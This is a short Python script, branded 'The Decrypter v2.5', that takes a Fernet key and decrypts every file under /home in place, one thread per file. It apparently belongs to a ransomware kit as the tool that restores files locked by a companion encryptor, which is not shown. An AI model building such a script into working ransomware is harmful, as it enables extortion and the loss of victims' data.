import os
import time
import threading
from cryptography.fernet import Fernet
print (r'''
,---. .         ,-.                      .          
  |   |         |  \                     |          
  |   |-. ,-.   |  | ,-. ,-. ;-. . . ;-. |-  ,-. ;-.
  |   | | |-'   |  / |-' |   |   | | | | |   |-' |  
  '   ' ' `-'   `-'  `-' `-' '   `-| |-' `-' `-' '  
                                 `-' '              
v2.5
Copyright: @ALHARAN
''')
# Load the encryption key
key = input('Enter The Key To Decrypt Files: ')

# Initialize the Fernet object with the key
cipher = Fernet(key)

# Define the target directory
home_dir = '/home'

# Initialize a set to store directories where files are decrypted
decrypted_dirs = set()

def decrypt_file(file, cipher):
    try:
        with open(file, 'rb') as thefile:
            contents_encrypted = thefile.read()
        contents_decrypted = cipher.decrypt(contents_encrypted)
        with open(file, 'wb') as thefile:
            thefile.write(contents_decrypted)
        # Add the directory of the decrypted file to the set
        decrypted_dirs.add(os.path.dirname(file))
        print(f"[*] Decrypted: {file}")
    except FileNotFoundError:
        return
    except Exception as e:
        return

# Collect all files to decrypt in the /home directory
files = []
for dirpath, dirnames, filenames in os.walk(home_dir):
    for filename in filenames:
        file_path = os.path.join(dirpath, filename)
        files.append(file_path)

# Start the timer and create threads for decryption
start_time = time.time()
threads = []
for file in files:
    thread = threading.Thread(target=decrypt_file, args=(file, cipher))
    thread.start()
    threads.append(thread)

# Wait for all threads to complete
for thread in threads:
    thread.join()

# Print the directories where files were decrypted
for dir_name in decrypted_dirs:
    print(f"[*] Decrypted files in directory: {dir_name}")
for thread in threads:
    thread.join()
end_time_actual = time.time()
print(f"[*] Decryption process ended in {end_time_actual - start_time:.2f} seconds.")
                                                 
